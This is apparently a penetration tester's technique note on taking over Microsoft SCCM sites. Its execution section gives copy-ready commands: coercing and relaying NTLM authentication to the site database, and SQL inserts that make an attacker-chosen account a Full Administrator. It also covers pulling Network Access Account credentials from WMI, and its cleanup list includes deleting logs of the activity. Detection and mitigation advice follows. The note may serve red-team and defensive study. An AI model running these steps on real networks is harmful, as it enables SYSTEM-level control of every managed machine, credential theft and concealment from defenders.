---
tags:
  - "#type/technique"
  - "#tactic/TA0004"
  - "#technique/T1210"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#service/sccm"
  - "#tool/msfconsole"
aliases:
  - SCCM Site Takeover
  - ConfigMgr Privilege Escalation
  - System Center Configuration Manager Abuse
---

## Technique
___

[GitHub - misonfiguration-manager](https://github.com/subat0mik/Misconfiguration-Manager)

SCCM Site Takeover refers to a collection of attack techniques that target Microsoft System Center Configuration Manager (SCCM/MECM) environments to gain full administrative privileges. With these privileges, an attacker can execute arbitrary code as SYSTEM on any managed device in the environment (often thousands of systems). Several takeover methods exist:

1. **TAKEOVER-1: NTLM Relay to MSSQL**: Exploits environments where the SCCM database is on a separate server from the Primary Site Server. By coercing authentication from site components and relaying to MSSQL, attackers can directly modify security tables.

2. **TAKEOVER-2: NTLM Relay to SMB**: Similar to the first method, but relays to SMB on the database server to gain local admin access to the filesystem and database.

3. **TAKEOVER-3: NTLM Relay to AD CS**: Coerces authentication from SCCM components and relays to AD Certificate Services to obtain certificates for impersonation.

4. **TAKEOVER-4: CAS to Primary Site Relay**: Exploits communication between Central Administration Site and Primary Site Servers.

5. **TAKEOVER-5: Relay to AdminService**: Targets the RESTful AdminService API on the SMS Provider.

6. **TAKEOVER-6: Relay to SMS Provider SMB**: Coerces authentication and relays to the SMS Provider via SMB.

7. **TAKEOVER-7: High Availability Component Relay**: Exploits communication between primary and passive site servers in HA deployments.

8. **TAKEOVER-8: Relay to LDAP**: Coerces authentication from SCCM components and relays to domain controllers.

9. **TAKEOVER-9: Database Link Crawling**: Exploits database links configured with excessive privileges.

10. **Network Access Account (NAA) Abuse**: Extracts credentials of the Network Access Account used for OS deployment, which often has extensive permissions.

Each technique aims to add an attacker-controlled account to the "Full Administrator" role, granting complete control over the environment.

## Prerequisites
___

**Access Level:**
- Low-privilege domain account for initial enumeration and coercion
- For Takeover Method 2: Local administrator access on at least one SCCM-managed endpoint

**System State Requirements:**
- **For NTLM Relay Method**:
  - SCCM deployment with separate Primary Site Server and MSSQL database server
  - Primary Site Server's machine account has local admin rights on the database server
  - SMB signing not enforced on the database server
  - MSSQL service accessible and not using Extended Protection for Authentication (EPA)
  - Coercion vulnerabilities available on the Primary Site Server

- **For NAA Abuse Method**:
  - Network Access Account configured with excessive permissions
  - PXE boot or OS deployment functionality enabled
  
**Tools Required:**
- Enumeration: SharpSCCM, sccmhunter
- NTLM Relay: Impacket's ntlmrelayx.py
- Authentication Coercion: PetitPotam, Coercer
- SQL Access: Impacket's mssqlclient.py

## Considerations
___

**Impact**

A successful SCCM site takeover provides:
- Complete control over all managed endpoints (often thousands of systems)
- Ability to execute arbitrary code as SYSTEM across the enterprise
- Deployment of malicious applications under the guise of legitimate software updates
- Access to sensitive resources used during OS deployment
- Potential for long-term persistence via custom client settings and policies

**OPSEC**

- **Authentication Coercion**: Tools like PetitPotam generate logs that might be monitored
- **NTLM Relay**: Machine accounts authenticating from unexpected sources is suspicious
- **Database Modifications**: Direct modifications to RBAC tables may trigger alerts if database auditing is enabled
- **Console Actions**: After gaining SCCM admin access, all actions in the console are logged and attributable to the compromised account
- **Client Deployments**: Deploying applications or scripts to all systems simultaneously is highly visible

## Enumeration
___

**sccmhunter.py (Linux)**

```bash
# Discover SCCM infrastructure
python3 sccmhunter.py find -u <user> -p <pass> -d <domain> -dc-ip <dc-ip>

# Display all discovered information
python3 sccmhunter.py show -all

# Profile SMB shares and configurations
python3 sccmhunter.py smb -u <user> -p <pass> -d <domain> -dc-ip <dc-ip> -save

# Prepare SQL commands for admin access (useful for TAKEOVER-1)
python3 sccmhunter.py mssql -dc-ip <dc-ip> -d <domain> -u <user> -p <pass> -tu <target_user> -sc <site_code> -stacked
```

**SharpSCCM (Windows)**

```powershell
# Get site information
SharpSCCM.exe get site-info

# Get SID of current user for use in takeover
SharpSCCM.exe local user-sid

# List site users
SharpSCCM.exe get users
```

## Execution
___

### Method 1: NTLM Relay to SQL Server

**Step 1: Set up NTLM Relay**

Start ntlmrelayx to listen for incoming connections and relay to the MSSQL server:

```bash
impacket-ntlmrelayx -t "mssql://<MSSQL_SERVER_IP>" -smb2support -socks
```

OR directly from ntlmrelayx (can work if proxy is giving issues)

```bash
impacket-ntlmrelayx -t "mssql://<MSSQL_SERVER_IP>" -smb2support -i
```
(Then netcat into bind)

**Step 2: Coerce Authentication from the Primary Site Server**

Using PetitPotam:
```bash
python3 PetitPotam.py -u <user> -p '<password>' -d <domain> <ATTACKER_IP> <PRIMARY_SITE_SERVER_IP>
```

Alternatively, using Coercer to try multiple methods:
```bash
python3 coercer.py coerce -l <attackerIP> -t <targetIP> -u 'user' -p 'pass' -d <domain.local> -v
```

**Step 3: Access the Database via Relayed Session**

Connect to the database using the relayed credentials through the SOCKS proxy:
```bash
proxychains4 -q python3 mssqlclient.py 'DOMAIN/PRIMARY_SITE_SERVER_NAME$'@<MSSQL_SERVER_IP> -windows-auth -no-pass
```

**Step 4: Add Your Account as SCCM Full Administrator**

First, get your SID in PowerShell:
```powershell
Get-DomainUser <User> -Properties objectsid
```

Convert SID to binary format (PowerShell):
```powershell
function Convert-StringSidToBinary {
    param ([string]$StringSid)
    $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
    $binarySid = New-Object byte[] ($sid.BinaryLength)
    $sid.GetBinaryForm($binarySid, 0)
    $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
    echo "0x$($binarySidHex.ToLower())"
}

Convert-StringSidToBinary "<SID>"
```

In the SQL connection, execute these queries to add yourself as admin:
```sql
USE CM_<SiteCode>;
INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, SourceSite) VALUES (<hex_of_converted_sid>, 'DOMAIN\User', 0, 0, '<SiteCode>');

-- Get your new AdminID
SELECT AdminID, LogonName FROM RBAC_Admins;

-- Add Full Administrator permissions (use your AdminID from above)
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (<new_admin_id>, 'SMS0001R', 'SMS00ALL', '29');
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (<new_admin_id>, 'SMS0001R', 'SMS00001', '1');
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (<new_admin_id>, 'SMS0001R', 'SMS00004', '1');
```

or execute directly in relay:

```bash
impacket-ntlmrelayx -t "mssql://<SITE_DB_IP>" -smb2support -ts -q "USE CM_<SiteCode>; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,SourceSite) VALUES (0x[HEX_SID],'DOMAIN\\User',0,0,'<SiteCode>');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'DOMAIN\\User'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'DOMAIN\\User'),'SMS0001R','SMS00001','1');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'DOMAIN\\User'),'SMS0001R','SMS00004','1');"
```


**Step 5: Login to SCCM Console**

You can now login to the SCCM console with your account and have full administrative access. From here you can:
- Deploy applications to any/all systems
- Create custom scripts to run as SYSTEM
- Access sensitive resources
- Create persistence mechanisms

### Method 2: Network Access Account (NAA) Abuse

This method involves extracting and using the Network Access Account, which often has extensive permissions in the domain.

**Step 1: Identify NAA credentials on a managed endpoint**

On a system where you have administrative access:
```powershell
# Check if you can access the PolicyProvider.log
Get-Content "C:\Windows\CCM\Logs\PolicyProvider.log" | Select-String "NAA"

# Extract Network Access Account from WMI
$Namespace = "ROOT\ccm\policy\Machine\ActualConfig"
$Class = "CCM_NetworkAccessAccount"
$NAA = Get-WmiObject -Namespace $Namespace -Class $Class
$NAA
```

**Step 2: Decrypt the credentials**

The credentials are encrypted but can often be extracted using tools like Mimikatz or other SCCM-specific tooling.

**Step 3: Use the NAA credentials for lateral movement**

The NAA often has significant permissions across the domain. Test access to resources:
```powershell
Invoke-Command -ComputerName <target> -ScriptBlock {whoami} -Credential $credential
```

### Cleanup Considerations

- Remove your account from the SCCM administrators in the database
- Delete any applications, packages, or task sequences you created
- Remove any scripts or collections created during testing
- Delete logs of your activities if possible
## Detection & Mitigation
___

### Detection

**For NTLM Relay Attack:**
- Monitor for authentication coercion attempts (e.g., EFS RPC calls from PetitPotam)
- Alert on machine accounts authenticating from unexpected IP addresses
- Implement database auditing to detect direct modifications to RBAC_* tables
- Monitor Event ID 4624 (successful logon) for SCCM machine accounts from unusual sources
- Watch for unexpected new administrators in the SCCM console

**For NAA Abuse:**
- Monitor for unusual access patterns using the Network Access Account
- Watch for credential extraction attempts on managed endpoints
- Monitor SCCM client logs for unauthorized access attempts

### Mitigation

**For NTLM Relay Attack:**
- Enable Extended Protection for Authentication (EPA) on the MSSQL service
- Require SMB Signing on all servers, especially SCCM infrastructure
- Co-locate the SCCM database on the Primary Site Server when possible
- Apply security updates that address NTLM relay and coercion vulnerabilities
- Use Privileged Access Workstations (PAWs) for SCCM administration

**For NAA Abuse:**
- Implement least privilege for the Network Access Account
- Consider using Group Managed Service Accounts (gMSAs) instead of regular domain accounts
- Regularly rotate NAA credentials
- Segment SCCM infrastructure on its own network
- Implement Just-In-Time administration for SCCM console access
- Use certificate-based authentication for client access when possible
